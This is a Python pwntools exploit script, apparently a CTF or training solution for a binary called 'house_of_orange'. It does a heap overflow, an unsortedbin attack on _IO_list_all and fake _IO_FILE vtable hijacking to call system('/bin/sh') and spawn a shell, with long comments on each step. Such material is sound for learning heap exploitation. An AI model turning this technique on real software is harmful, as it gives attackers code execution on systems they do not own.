#!/usr/bin/env python3


from pwn import *

BINARY = './house_of_orange'
LIBC = './libc.so.6'
ADDR = 'localhost'
PORT = 4444

splash()
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)


def conn():
    if args.LOCAL:
        pty = process.PTY
        io = process(elf.path, stdin=pty, stdout=pty, stderr=pty)
        io.timeout = 0.1

        return io

    if args.PWNDBG:
        context.log_level = 'debug'
        context.terminal = ['tmux', 'splitw', '-h']
        return gdb.debug(elf.path, gdbscript='''init-pwndbg''')

    else:
        io = remote(ADDR, PORT)
        io.timeout = 0.1

        return io


def small_malloc(io):
    io.send("1")
    io.recvuntil("> ")


def large_malloc(io):
    io.send("2")
    io.recvuntil("> ")


def edit(io, data):
    io.send("3")
    io.sendafter("data: ", data)
    io.recvuntil("> ")


def solve():
    io = conn()

    io.recvuntil("puts() @ ")
    libc.address = int(io.recvline(), 16) - libc.sym.puts
    io.recvuntil("heap @ ")
    heap = int(io.recvline(), 16)

    log.info("libc base found at: " + hex(libc.address))
    log.info("heap base found at: " + hex(heap))
    io.recvuntil("> ")

    """
    Request a small chunk of size 0x20. This chunk will be used to overflow
    into the top chunk, overwriting the top chunk's size field.
    """
    small_malloc(io)

    """
    The edit() function conducts no bounds checking. We will edit the first
    small chunk on the heap, overflowing its contents until we overwrite the
    size field of the top chunk. Because of glibc's top chunk checking /
    overflow mitigations, we have to make sure the top chunk size is
    page-aligned and that the prev_inuse bit is set. We are overwriting the
    top chunk size to be smaller than our large_malloc() request, forcing
    malloc() to request more memory from the kernel.
    """
    payload = [
        cyclic(0x18, n=8),
        0x1000 - 0x20 + 0x1
    ]
    edit(io, flat(payload))

    """
    Make a large request, forcing malloc() to request more memory from the
    kernel. Because the top chunk size was corrupted to be smaller than its
    actual size, we fool malloc() into thinking that the newly mmap()'d memory
    segment is not contiguous with the old location of the top chunk. This
    causes malloc() to call free() on the remaining space of
    the top chunk. Because the newly free()'d chunk is too large to be linked
    into the fastbin, it is linked into the unsortedbin.
    """
    large_malloc(io)

    """
    We overflow our small chunk again, overwriting the size field of the top
    chunk to 0x61, and setting its bk to a fake chunk that overlaps the
    location of libc.sym._IO_list_all. This symbol contains the head of the
    _IO_list_all linked list, a list of all the file stream structures for
    currently open files. When we conduct our unsortedbin attack, we will
    overwrite this symbol, pointing the linked list to the main_arena.

    This causes _IO_list_all to treat the main_arena as a file stream structure
    . The main_arena will fail checks related to traversing the list, and the
    chain member of the main_arena will be inspected next. Because our
    overwritten free / top chunk was the size of a smallbin, the chunk was
    linked into the smallbin when our unsortedbin attack was triggered.

    The main_arena's chain member will point to this chunk on the heap where we
    control the memory, and here is where we construct a fake _IO_FILE struct.
    We construct our fake _IO_FILE struct in such a manner that, when the
    vtable is used to search for the overflow member, overflow will be written
    to be libc.sym.system. The top address to the top of the _IO_FILE struct is
    passed as an argument to overflow, so we ensure the flags (usually NULL
    bytes) of our overwritten chunk contain "/bin/sh\0".
    """
    fd = 0
    bk = libc.sym._IO_list_all - 0x10
    write_base = 1
    write_ptr = 2
    mode = 0
    vtable_ptr = heap + 0xd8
    overflow = libc.sym.system

    payload = [
        b"\x00" * 0x10 + b"/bin/sh\0",
        0x61,
        fd,
        bk,
        write_base,
        write_ptr,
        p64(0) * 18,
        p32(mode) + p32(0),
        0,
        overflow,
        vtable_ptr
    ]
    edit(io, flat(payload))

    """
    We request another chunk of size 0x20. malloc() traverses our unsortedbin
    to search for a free chunk matching this requirement, and encounters our
    chunk containing the fake _IO_FILE struct. Because it is too large, the
    _IO_FILE struct chunk is linked into the smallbin. malloc() follows the
    bk of our _IO_FILE struct chunk to the main_arena, failing a chunk metadata
    check and causing __malloc_printerr() to execute. This raises a SIGABRT,
    and glibc begins flushing the buffer of every _IO_FILE in _IO_list_all
    before exiting. This allows us to gain code execution - our vtable_ptr
    is followed to our fake vtable on the heap. Here, our overflow function
    is pointing to libc.sym.system. When the overflow function of our vtable is
    called, we execute libc.sym.system() with the pointer to our _IO_FILE
    struct. Because we placed "/bin/sh\0" at the very beginning of our _IO_FILE
    struct, we instead execute libc.sym.system("/bin/sh\0").
    """
    small_malloc(io)


    io.interactive()


if __name__ == "__main__":
    solve()
